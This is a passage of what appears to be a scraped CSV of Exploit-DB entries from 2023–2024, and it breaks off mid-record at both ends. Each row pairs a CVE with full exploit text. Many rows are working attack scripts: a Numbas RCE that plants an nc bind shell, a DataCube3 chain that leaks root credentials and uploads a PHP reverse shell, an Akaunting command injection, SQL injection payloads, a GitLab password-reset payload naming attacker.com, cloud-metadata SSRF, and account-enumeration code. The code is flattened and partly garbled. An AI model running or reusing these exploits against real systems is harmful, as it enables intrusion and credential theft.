not (targetip and command): print(""Both --target and --command options are required.\nor use --creds option to see hardcoded Credentials."") return sendpostrequest(targetip, command,targetport) if name == ""main"": banner() main()"
CVE-2023-7028,"{""CVE-2023-7028"": 1}",2024-03-14,GitLab CE/EE &lt; 16.7.2 - Password Reset,https://www.exploit-db.com/exploits/51889,"Exploit Title: GitLab CE/EE < 16.7.2 - Password Reset Exploit Author: Sebastian Kriesten (0xB455) Twitter: <URL> Date: 2024-01-12 Vendor Homepage: gitlab.com Vulnerability disclosure: <URL> Version: <16.7.2, <16.6.4, <16.5.6 CVE: CVE-2023-7028 Proof of Concept: user[email][]=valid.com&user[email][]=attacker.com"
CVE-2024-27612,"{""CVE-2024-27612"": 1}",2024-03-10,Numbas &lt; v7.3 - Remote Code Execution,https://www.exploit-db.com/exploits/51867,"Exploit Title: Numbas < v7.3 - Remote Code Execution Google Dork: N/A Date: March 7th, 2024 Exploit Author: Matheus Boschetti Vendor Homepage: <URL> Software Link: <URL> Version: 7.2 and below Tested on: Linux CVE: CVE-2024-27612 import sys, requests, re, argparse, subprocess, time from bs4 import BeautifulSoup s = requests.session() def getCSRF(target): url = f"" <URL> req = s.get(url) soup = BeautifulSoup(req.text, 'html.parser') csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value'] return csrfmiddlewaretoken def createTheme(target): Format request csrfmiddlewaretoken = getCSRF(target) theme = 'ExampleTheme' boundary = '-WebKitFormBoundaryKUMXsLP31HzARUV1' data = ( f'--{boundary}\r\n' 'Content-Disposition: form-data; name=""csrfmiddlewaretoken""\r\n' '\r\n' f'{csrfmiddlewaretoken}\r\n' f'--{boundary}\r\n' 'Content-Disposition: form-data; name=""name""\r\n' '\r\n' f'{theme}\r\n' f'--{boundary}--\r\n' headers = {'Content-Type': f'multipart/form-data; boundary={boundary}', 'User-Agent': 'Mozilla/5.0', 'Accept': '/', 'Connection': 'close'} Create theme and return its ID req = s.post(f"" <URL> headers=headers, data=data) redir = req.url split = redir.split('/') id = split[4] print(f""\t[i] Theme created with ID {id}"") return id def login(target, user, passwd): print(""\n[i] Attempting to login."") csrfmiddlewaretoken = getCSRF(target) data = {'csrfmiddlewaretoken': csrfmiddlewaretoken, 'username': user, 'password': passwd, 'next': '/'} Login login = s.post(f"" <URL> data=data, allowredirects=True) res = login.text if(""Logged in as"" not in res): print(""\n\n[!] Login failed!"") sys.exit(-1) Check if logged and fetch ID usermatch = re.search(r'Logged in as (.*?) ', res) if usermatch: user = usermatch.group(1) idmatch = re.search(r' ', res) if idmatch: id = idmatch.group(1) print(f""\t[+] Logged in as \""{user}\"" with ID {id}"") def checkVuln(url): print(""[i] Checking if target is vulnerable."") Attempt to read files themeID = createTheme(url) target = f"" <URL> hname = s.get(f""{target}/etc/hostname"") ver = s.get(f""{target}/etc/issue"") hnamesoup = BeautifulSoup(hname.text, 'html.parser') versoup = BeautifulSoup(ver.text, 'html.parser') hostname = hnamesoup.find('textarea').gettext().strip() version = versoup.find('textarea').gettext().strip() if len(hostname) < 1: print(""\n\n[!] Something went wrong - target might not be vulnerable."") sys.exit(-1) print(f""\n[+] Target \""{hostname}\"" is vulnerable!"") print(f""\t[i] Running: \""{version}\"""") Cleanup - delete theme print(f""\t\t[i] Cleanup: deleting theme {themeID}."") target = f"" <URL> csrfmiddlewaretoken = getCSRF(url) data = {'csrfmiddlewaretoken':csrfmiddlewaretoken} s.post(target, data=data) def replaceInit(target): Overwrite init.py with arbitrary code rport = '8443' payload = f""import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])"" csrfmiddlewaretoken = getCSRF(target) filename = '../../../../numbaseditor/numbas/init.py' themeID = createTheme(target) data = {'csrfmiddlewaretoken': csrfmiddlewaretoken, 'source': payload, 'filename': filename} print(""[i] Delivering payload."") Retry 5 times in case something goes wrong. for attempt in range(5): try: s.post(f"" <URL> data=data, timeout=10) except Exception as e: pass Establish connection to bind shell time.sleep(2) print(f""\t[+] Payload delivered, establishing connection.\n"") if "":"" in target: split = target.split("":"") ip = split[0] else: ip = str(target) subprocess.Popen([""nc"", ""-n"", ip, rport]) while True: pass def main(): parser = argparse.ArgumentParser() if len(sys.argv) <= 1: print(""\n[!] No option provided!"") print(""\t- check: Passively check if the target is vulnerable by attempting to read files from disk\n\t- exploit: Attempt to actively exploit the target\n"") print(f""[i] Usage: python3 {sys.argv[0]} --target 172.16.1.5:80 --user example --passwd qwerty"") sys.exit(-1) group = parser.addmutuallyexclusivegroup(required=True) group.addargument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit') parser.addargument('--target', help='Target IP:PORT') parser.addargument('--user', help='Username to authenticate') parser.addargument('--passwd', help='Password to authenticate') args = parser.parseargs() action = args.action target = args.target user = args.user passwd = args.passwd print(""\n\t\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-"") if action == 'check': login(target, user, passwd) checkVuln(target) elif action == 'exploit': login(target, user, passwd) replaceInit(target) else: sys.exit(-1) if name == ""main"": main()"
CVE-2024-25832,"{""CVE-2024-25832"": 1}",2024-03-10,DataCube3 v1.0 - Unrestricted file upload &#039;RCE&#039;,https://www.exploit-db.com/exploits/51868,"Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE' Date: 7/28/2022 Exploit Author: Samy Younsi - NS Labs ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: Ver1.0 Tested on: DataCube3 version 1.0 (Ubuntu) CVE : CVE-2024-25830 + CVE-2024-25832 Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload from future import printfunction, unicodeliterals from bs4 import BeautifulSoup import argparse import requests import json import urllib3 import re urllib3.disablewarnings() def banner(): dataCube3Logo = "" ▒██ DataCube3 Ver1.0 █F-logic▓▓ \033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m \033[1;91mDataCube3 exploit chain reverse shell\033[1;m FOR EDUCATIONAL PURPOSE ONLY. return print('\033[1;94m{}\033[1;m'.format(dataCube3Logo)) def extractRootPwd(RHOST, RPORT, protocol): url = '{}://{}:{}/admin/configall.php'.format(protocol, RHOST, RPORT) try: response = requests.get(url, allowredirects=False, verify=False, timeout=20) if response.statuscode != 302: print('[!] \033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\033[1;m') exit() soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser') scriptTag = str(soup.findall('script')[12]).replace(' ', '') rawLeakedData = re.findall('configData:.*,', scriptTag)[0] jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0])) adminPassword = jsonLeakedData[12]['value'] rootPassword = jsonLeakedData[14]['value'] print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword)) return rootPassword except: print('[ERROR] Can\'t grab the DataCube3 version.') def generateAuthCookie(RHOST, RPORT, protocol, rootPassword): print('[INFO] Generating DataCube3 auth cookie .') url = '{}://{}:{}/admin/configall.php'.format(protocol, RHOST, RPORT) data = { 'userid': 'root', 'userpw': rootPassword, 'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3' try: response = requests.post(url, data=data, allowredirects=False, verify=False, timeout=20) if response.statuscode != 302: print('[!] \033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\033[1;m') exit() authCookie = response.cookies.getdict() print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie)) return authCookie except: print('[ERROR] Can\'t grab the auth cookie, is the root password correct?') def extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie): print('[INFO] Extracting Accesstime .') url = '{}://{}:{}/admin/settingphoto.php'.format(protocol, RHOST, RPORT) try: response = requests.get(url, cookies=authCookie, allowredirects=False, verify=False, timeout=20) if response.statuscode != 302: print('[!] \033[1;91mError: An error occur while trying to get the accesstime value.\033[1;m') exit() soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser') accessTime = soup.find('input', {'name': 'accesstime'}).get('value') print('[INFO] AccessTime value: {}'.format(accessTime)) return accessTime except: print('[ERROR] Can\'t grab the accesstime value, is the root password correct?') def injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime): print('[INFO] Injecting PHP reverse shell script .') filename='rvs.php' payload = ' $sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT) data = '-113389720123090127612523184396\r\nContent-Disposition: form-data; name=""add""\r\n\r\nå��ç��è¿½å�\xA0\r\n-113389720123090127612523184396\r\nContent-Disposition: form-data; name=""addPhoto""; filename=""{}""\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n-113389720123090127612523184396\r\nContent-Disposition: form-data; name=""accesstime""\r\n\r\n{}\r\n-113389720123090127612523184396--\r\n'.format(filename, payload, accessTime) headers = { 'Content-Type': 'multipart/form-data; boundary=-113389720123090127612523184396' url = '{}://{}:{}/admin/settingphoto.php'.format(protocol, RHOST, RPORT) try: response = requests.post(url, cookies=authCookie, headers=headers, data=data, allowredirects=False, verify=False, timeout=20) if response.statuscode != 302: print('[!] \033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\033[1;m') exit() shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename) print('[INFO] PHP reverse shell script successfully uploaded!\n[INFO] SHELL URL: {}'.format(shellURL)) return shellURL except: print('[ERROR] Can\'t upload the PHP reverse shell script, is the root password correct?') def execReverseShell(shellURL): print('[INFO] Executing reverse shell.') try: response = requests.get(shellURL, allowredirects=False, verify=False) print('[INFO] Reverse shell successfully executed.') return except Exception as e: print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}') return False def main(): banner() args = parser.parseargs() protocol = 'https' if args.RPORT == 443 else 'http' rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol) authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword) accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie) shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime) execReverseShell(shellURL) if name == 'main': parser = argparse.ArgumentParser(description='Script"
CVE-2024-27620,"{""CVE-2024-27620"": 1}",2024-03-10,Ladder v0.0.21 - Server-side request forgery (SSRF),https://www.exploit-db.com/exploits/51869,"Exploit Title: Ladder v0.0.21 - Server-side request forgery (SSRF) Date: 2024-01-20 Exploit Author: Software Link: <URL> Version: v0.0.1 - v0.0.21 Tested on: Ubuntu 20.04.6 LTS on AWS EC2 (ami-0fd63e471b04e22d0) CVE: CVE-2024-27620 Description: Ladder fails to apply sufficient default restrictions on destination addresses, allowing an attacker to make GET requests to addresses that would typically not be accessible from an external context. An attacker can access private address ranges, locally listening services, and cloud instance metadata APIs import requests import json targeturl = "" <URL> imdsv1url = "" <URL> r = requests.get(targeturl + imdsv1url) responsejson = json.loads(r.text) print(response_json[""body""])"
CVE-2024-22836,"{""CVE-2024-22836"": 1}",2024-03-10,Akaunting &lt; 3.1.3 - RCE,https://www.exploit-db.com/exploits/51870,"Exploit Title: Akaunting < 3.1.3 - RCE Date: 08/02/2024 Exploit Author: u32i.me Vendor Homepage: <URL> Software Link: <URL> Version: <= 3.1.3 Tested on: Ubuntu (22.04) CVE : CVE-2024-22836 #!/usr/bin/python3 import sys import re import requests import argparse def getcompany(): print(""[INF] Retrieving company id."") res = requests.get(target, headers=headers, cookies=cookies, allowredirects=False) if res.statuscode != 302: print(""[ERR] No company id was found!"") sys.exit(3) cid = res.headers['Location'].split('/')[-1] if cid == ""login"": print(""[ERR] Invalid session cookie!"") sys.exit(7) return cid def gettokens(url): res = requests.get(url, headers=headers, cookies=cookies, allowredirects=False) searchres = re.search(r""\""csrfToken\""\:\"".\"""", res.text) if not search_res: print(""[ERR] Couldn't get csrf token"") sys.exit(1) data = {} data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('""', '') data['session'] = res.cookies.get('akaunting_session') return data def inject_command(cmd): url = f""{target}/{company_id}/wizard/companies"" tokens = get_tokens(url) headers.update({""X-Csrf-Token"": tokens['csrf_token']}) data = {""_token"": tokens['csrf_token'], ""_method"": ""POST"", ""_prefix"": ""company"", ""locale"": f""en_US && {cmd}""} res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False) if res.status_code == 200: res_data = res.json() if res_data['error']: print(""[ERR] Command injection failed!"") sys.exit(4) print(""[INF] Command injected!"") def trigger_rce(app, version = ""1.0.0""): print(""[INF] Executing the command."") url = f""{target}/{company_id}/apps/install"" data = {""alias"": app, ""version"": version, ""path"": f""apps/{app}/download""} headers.update({""Content-Type"":""application/json""}) res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False) if res.status_code == 200: res_data = res.json() if res_data['error']: search_res = re.search(r"">Exit Code\:.<"", resdata['message']) if searchres: print(""[ERR] Failed to execute the command"") sys.exit(6) print(""[ERR] Failed to install the app! no command was executed!"") sys.exit(5) print(""[INF] Executed successfully!"") def login(email, password): url = f""{target}/auth/login"" tokens = gettokens(url) cookies.update({ 'akauntingsession': tokens['session'] data = { ""token"": tokens['csrftoken'], ""method"": ""POST"", ""email"": email, ""password"": password req = requests.post(url, headers=headers, cookies=cookies, data=data) res = req.json() if res['error']: print(""[ERR] Failed to log in!"") sys.exit(8) print(""[INF] Logged in"") cookies.update({'akauntingsession': req.cookies.get('akauntingsession')}) def main(): injectcommand(args.command) triggerrce(args.alias, args.version) if name=='main': parser = argparse.ArgumentParser() parser.addargument(""-u"", ""--url"", help=""target url"") parser.addargument(""--email"", help=""user login email."") parser.addargument(""--password"", help=""user login password."") parser.addargument(""-i"", ""--id"", type=int, help=""company id (optional)."") parser.addargument(""-c"", ""--command"", help=""command to execute."") parser.addargument(""-a"", ""--alias"", help=""app alias, default: paypal-standard"", default=""paypal-standard"") parser.addargument(""-av"", ""--version"", help=""app version, default: 3.0.2"", default=""3.0.2"") args = parser.parseargs() headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36""} cookies = {} target = args.url try: login(args.email, args.password) companyid = get_company() if not args.id else args.id main() except: sys.exit(0)"
CVE-2022-4681,"{""CVE-2022-4681"": 1}",2024-03-10,Hide My WP &lt; 6.2.9 - Unauthenticated SQLi,https://www.exploit-db.com/exploits/51871,"Exploit Title: Wordpress Plugin Hide My WP < 6.2.9 - Unauthenticated SQLi Publication Date: 2023-01-11 Original Researcher: Xenofon Vassilakopoulos Exploit Author: Xenofon Vassilakopoulos Submitter: Xenofon Vassilakopoulos Vendor Homepage: <URL> Version: Hide My WP v6.2.8 and prior Tested on: Hide My WP v6.2.7 Impact: Database Access CVE: CVE-2022-4681 CWE: CWE-89 CVSS Score: 8.6 (high) #Description The plugin does not properly sanitize and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection. #Proof of Concept curl -k --location --request GET "" <URL> --header ""X-Forwarded-For: 127.0.0.1'+(select*from(select(sleep(20)a)+'"""
CVE-2024-27746,"{""CVE-2024-27746"": 1}",2024-03-03,Petrol Pump Management Software v.1.0 - SQL Injection,https://www.exploit-db.com/exploits/51838,"Exploit Title: Petrol Pump Management Software v.1.0 - SQL Injection Date: 01-03-2024 Exploit Author: Shubham Pandey Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows, Linux CVE : CVE-2024-27746 Description: SQL Injection vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the email address parameter in the index.php component."
CVE-2024-27744,"{""CVE-2024-27744"": 1}",2024-03-03,Petrol Pump Management Software v.1.0 - Stored Cross Site Scripting via SVG file,https://www.exploit-db.com/exploits/51837,"Exploit Title: Petrol Pump Management Software v.1.0 - Stored Cross Site Scripting via SVG file Date: 01-03-2024 Exploit Author: Shubham Pandey Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows, Linux CVE : CVE-2024-27744 Description: Cross Site Scripting vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the image parameter in the profile.php component."
CVE-2024-27743,"{""CVE-2024-27743"": 1}",2024-03-03,Petrol Pump Management Software v1.0 - &#039;Address&#039; Stored Cross Site Scripting,https://www.exploit-db.com/exploits/51836,"Exploit Title: Petrol Pump Management Software v1.0 - 'Address' Stored Cross Site Scripting Date: 01-03-2024 Exploit Author: Shubham Pandey Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows, Linux CVE : CVE-2024-27743 Description: Cross Site Scripting vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the Address parameter in the add_invoices.php component."
CVE-2024-27747,"{""CVE-2024-27747"": 1}",2024-03-03,Petrol Pump Management Software v1.0 - Remote Code Execution via File Upload,https://www.exploit-db.com/exploits/51839,"Exploit Title: Petrol Pump Management Software v1.0 - Remote Code Execution via File Upload Date: 01-03-2024 Exploit Author: Shubham Pandey Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows, Linux CVE : CVE-2024-27747 Description: File Upload vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the email Image parameter in the profile.php component."
CVE-2024-25736,"{""CVE-2024-25736"": 1}",2024-02-26,Wyrestorm Apollo VX20  &lt; 1.3.58 - Incorrect Access Control &#039;DoS&#039;,https://www.exploit-db.com/exploits/51815,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: <URL> [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] <URL> [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Incorrect Access Control (DOS) [Affected Product Code Base] APOLLO VX20 < 1.3.58, fixed in v1.3.58 [Affected Component] Web interface, reboot and reset commands [CVE Reference] CVE-2024-25736 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. Remote attackers can restart the device via a /device/reboot HTTP GET request. [Exploit/"
CVE-2024-25734,"{""CVE-2024-25734"": 1}",2024-02-26,Wyrestorm Apollo VX20 &lt; 1.3.58 - Account Enumeration,https://www.exploit-db.com/exploits/51814,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: <URL> [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] <URL> [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Account Enumeration [CVE Reference] CVE-2024-25734 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. The TELNET service prompts for a password only after a valid username is entered. Attackers who can reach the Apollo VX20 Telnet service can determine valid accounts, this can potentially allow for brute force attack on a valid account. [Exploit/"
CVE-2024-25735,"{""CVE-2024-25735"": 1}",2024-02-26,Wyrestorm Apollo VX20 &lt; 1.3.58 - Incorrect Access Control &#039;Credentials Disclosure&#039;,https://www.exploit-db.com/exploits/51816,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: <URL> [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] <URL> [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Incorrect Access Control (Credentials Disclosure) [Affected Component] Web interface, config [Affected Product Code Base] APOLLO VX20 < 1.3.58, fixed in v1.3.58 [CVE Reference] CVE-2024-25735 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. Remote attackers can discover cleartext credentials for the SoftAP (access point) Router /device/config using an HTTP GET request. The credentials are then returned in the HTTP response. curl -k <URL> E.g. HTTP response snippet: :{""enable"":""y"",""oncmd"":""8004"",""offcmd"":""8036""}},""screen"":""dual"",""ipconflict"":""y"",""wifi"":{""auto"":""y"",""band"":""5"",""channel"":""153""} ,""softAp"":{""password"":""12345678"",""router"":""y"",""softAp"":""y""}. [Exploit/"
CVE-2024-22318,"{""CVE-2024-22318"": 1}",2024-02-26,"IBM i Access Client Solutions v1.1.2 - 1.1.4, v1.1.4.3 - 1.1.9.4 - Remote Credential Theft",https://www.exploit-db.com/exploits/51817,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: <URL> [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] <URL> [Product] IBM i Access Client Solutions [Versions] All [Remediation/Fixes] None [Vulnerability Type] Remote Credential Theft [CVE Reference] CVE-2024-22318 [Security Issue] IBM i Access Client Solutions (ACS) is vulnerable to remote credential theft when NT LAN Manager (NTLM) is enabled on Windows workstations. Attackers can create UNC capable paths within ACS 5250 display terminal configuration "".HOD"" or "".WS"" files to point to a hostile server. If NTLM is enabled and the user opens an attacker supplied file the Windows operating system will try to authenticate using the current user's session. The attacker controlled server could then capture the NTLM hash information to obtain the user's credentials. [References] <URL> [Exploit/"
CVE-2023-3897,"{""CVE-2023-3897"": 1}",2024-02-19,SureMDM On-premise &lt; 6.31 - CAPTCHA Bypass User Enumeration,https://www.exploit-db.com/exploits/51804,"Exploit Title: SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration Date: 05/12/2023 Exploit Author: Jonas Benjamin Friedli Vendor Homepage: <URL> Version: <= 6.31 Tested on: 6.31 CVE : CVE-2023-3897 import requests import sys def printhelp(): print(""Usage: python script.py [URL] [UserListFile]"") sys.exit(1) def main(): if len(sys.argv) != 3 or sys.argv[1] == '-h': printhelp() url, userlistfile = sys.argv[1], sys.argv[2] try: with open(userlistfile, 'r') as file: users = file.read().splitlines() except FileNotFoundError: print(f""User list file '{userlistfile}' not found."") sys.exit(1) validusers = [] bypassdir = ""/ForgotPassword.aspx/ForgetPasswordRequest"" enumeratetxt = ""This User ID/Email ID is not registered."" for index, user in enumerate(users): progress = (index + 1) / len(users) * 100 print(f""Processing {index + 1}/{len(users)} users ({progress:.2f}%)"", end=""\r"") data = {""UserId"": user} response = requests.post( f""{url}{bypassdir}"", json=data, headers={""Content-Type"": ""application/json; charset=utf-8""} if response.statuscode == 200: responsedata = response.json() if enumeratetxt not in responsedata.get('d', {}).get('message', ''): validusers.append(user) print(""\nFinished processing users."") print(f""Valid Users Found: {len(validusers)}"") for user in validusers: print(user) if name == ""main_"": main()"
CVE-2020-11060,"{""CVE-2020-11060"": 1}",2023-10-09,GLPI GZIP(Py3) 9.4.5 - RCE,https://www.exploit-db.com/exploits/51726,#!/usr/bin/env python3 Exploit Title: GLPI GZIP(Py3) 9.4.5 - RCE Date: 08-30-2021 Exploit Authors: Brian Peters & n3rada Vendor Homepage: <URL> Software Link: <URL> Version: 0.8.5-9.4.5 Tested on: Exploit ran on Kali 2021. GLPI Ran on Windows 2019 CVE: 2020-11060 Built-in imports import argparse import random import re import string from datetime import datetime Third party library imports import requests from lxml import html # <URL>
CVE-2023-4708,"{""CVE-2023-4708"": 1}",2023-10-09,Clcknshop 1.0.0 - SQL Injection,https://www.exploit-db.com/exploits/51729,"Exploit Title: Clcknshop 1.0.0 - SQL Injection Exploit Author: CraCkEr Date: 16/08/2023 Vendor: Infosoftbd Solutions Vendor Homepage: <URL> Software Link: <URL> Demo: <URL> Version: 1.0.0 Tested on: Windows 10 Pro Impact: Database Access CVE: CVE-2023-4708 CWE: CWE-89 - CWE-74 - CWE-707 #Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /collection/all GET parameter 'tag' is vulnerable to SQL Injection <URL> Parameter: tag (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: tag=tshirt'XOR(SELECT(0)FROM(SELECT(SLEEP(6)a)XOR'Z"
CVE-2022-35919,"{""CVE-2022-35919"": 1}",2023-10-09,Minio 2022-07-29T19-40-48Z - Path traversal,https://www.exploit-db.com/exploits/51734,"Exploit Title: Minio 2022-07-29T19-40-48Z - Path traversal Date: 2023-09-02 Exploit Author: Jenson Zhao Vendor Homepage: <URL> Software Link: <URL> Version: Up to (excluding) 2022-07-29T19-40-48Z Tested on: Windows 10 CVE : CVE-2022-35919 Required before execution: pip install minio,requests import urllib.parse import requests, json, re, datetime, argparse from minio.credentials import Credentials from minio.signer import signv4s3 class MyMinio(): secure = False def init(self, baseurl, accesskey, secretkey): self.credits = Credentials( accesskey=accesskey, secretkey=secretkey if baseurl.startswith(' <URL> and baseurl.endswith('/'): self.url = baseurl + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd' elif baseurl.startswith(' <URL> and baseurl.endswith('/'): self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd' self.secure = True else: print('Please enter a URL address that starts with "" <URL> or "" <URL> and ends with ""/""\n') def"
CVE-2023-4278,"{""CVE-2023-4278"": 1}",2023-10-09,Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation,https://www.exploit-db.com/exploits/51735,"Exploit Title: Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation Google Dork: inurl:/user-public-account Date: 2023-09-04 Exploit Author: Revan Arifio Vendor Homepage: https:/.org/plugins/masterstudy-lms-learning-management-system/ Version: <= 3.0.17 Tested on: Windows, Linux CVE : CVE-2023-4278 import requests import os import re import time banner = "" || Title : Masterstudy LMS <= 3.0.17 - Unauthenticated Instructor Account Creation || || Author : <URL> || || Vendor Homepage : https:/wordpress.org/plugins/masterstudy-lms-learning-management-system/ || || Support : <URL> || print(banner) get nonce def getnonce(target): opentarget = requests.get(""{}/user-public-account"".format(target)) searchnonce = re.search('""stmlmsregister"":""(.*?)""', opentarget.text) if searchnonce[1] != None: return searchnonce[1] else: print(""Failed when getting Nonce :p"") privielege escalation def privesc(target, nonce, username, password, email): reqdata = { ""userlogin"":""{}"".format(username), ""useremail"":""{}"".format(email), ""userpassword"":""{}"".format(password), ""userpasswordre"":""{}"".format(password), ""becomeinstructor"":True, ""privacypolicy"":True, ""degree"":"""", ""expertize"":"""", ""auditory"":"""", ""additional"":[], ""additionalinstructors"":[], ""profiledefaultfieldsforregister"":[], ""redirectpage"":""{}/user-account/"".format(target) start = requests.post(""{}/wp-admin/admin-ajax.php?action=stmlmsregister&nonce={}"".format(target, nonce), json = reqdata) if start.statuscode == 200: print(""[+] Exploit Success !!"") else: print(""[+] Exploit Failed :p"") URL target target = input(""[+] URL Target: "") print(""[+] Starting Exploit"") plugincheck = requests.get(""{}/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt"".format(target)) pluginversion = re.search(""Stable tag: (.+)"", plugincheck.text) intversion = pluginversion[1].replace(""."", """") time.sleep(1) if int(intversion) < 3018: print(""[+] Target is Vulnerable !!"") Credential email = input(""[+] Email: "") username = input(""[+] Username: "") password = input(""[+] Password: "") time.sleep(1) print(""[+] Getting Nonce."") getnonce = getnonce(target) Get Nonce if getnonce != None: print(""[+] Success Getting Nonce: {}"".format(getnonce)) time.sleep(1) Start PrivEsc privesc(target, get_nonce, username, password, email) else: print(""[+] Target is NOT Vulnerable :p"")"
CVE-2023-4634,"{""CVE-2023-4634"": 1}",2023-10-09,Media Library Assistant Wordpress Plugin - RCE and LFI,https://www.exploit-db.com/exploits/51737,"Exploit Title: Media Library Assistant Wordpress Plugin - RCE and LFI Date: 2023/09/05 CVE: CVE-2023-4634 Exploit Author: Florent MONTEL / Patrowl.io / / Twitter Exploitation path: <URL> Exploit: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: < 3.10 Tested on: 3.09 Description: Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php LFI Steps to trigger conversion of a remote SVG Create a remote FTP server at ftp://X.X.X.X:21 (http will not work, see references) Host 2 files : - malicious.svg - malicious.svg[1] Payload: For LFI, getting wp-config.php: Both malicious.svg and malicious.svg[1] on the remote FTP: xmlns="" <URL> Then trigger conversion with: <URL> Directory listing or RCE: To achieve Directory listing or even RCE, it is a little more complicated. Use exploit available here: <URL> Note Exploitation will depend on the policy.xml Imagick configuration file installed on the remote server. All exploitation paths and scripts have been performed with a default wordpress configuration and installation (Wordpress has high chance to have the default Imagick configuration)."
CVE-2023-39362,"{""CVE-2023-39362"": 1}",2023-10-09,Cacti 1.2.24 - Authenticated command injection when using SNMP options,https://www.exploit-db.com/exploits/51740,"Exploit Title: Cacti 1.2.24 - Authenticated command injection when using SNMP options Date: 2023-07-03 Exploit Author: Antonio Francesco Sardella Vendor Homepage: <URL> Software Link: <URL> Version: Cacti 1.2.24 Tested on: Cacti 1.2.24 installed on 'php:7.4.33-apache' Docker container CVE: CVE-2023-39362 Category: WebApps Original Security Advisory: <URL> Example Vulnerable Application: <URL> Vulnerability discovered and reported by: Antonio Francesco Sardella Cacti 1.2.24 - Authenticated command injection when using SNMP options (CVE-2023-39362) Executive Summary In Cacti 1.2.24, under certain conditions, an authenticated privileged user, can use a malicious string in the SNMP options of a Device, performing command injection and obtaining remote code execution on the underlying server. Exploit Prerequisites: - The attacker is authenticated. - The privileges of the attacker allow to manage Devices and/or Graphs, e.g., ""Sites/Devices/Data"", ""Graphs"". - A Device that supports SNMP can be used. - Net-SNMP Graphs can be used. - snmp module of PHP is not installed. Example of an exploit: - Go to ""Console"" > ""Create"" > ""New Device"". - Create a Device that supports SNMP version 1 or 2. - Ensure that the Device has Graphs with one or more templates of: - ""Net-SNMP - Combined SCSI Disk Bytes"" - ""Net-SNMP 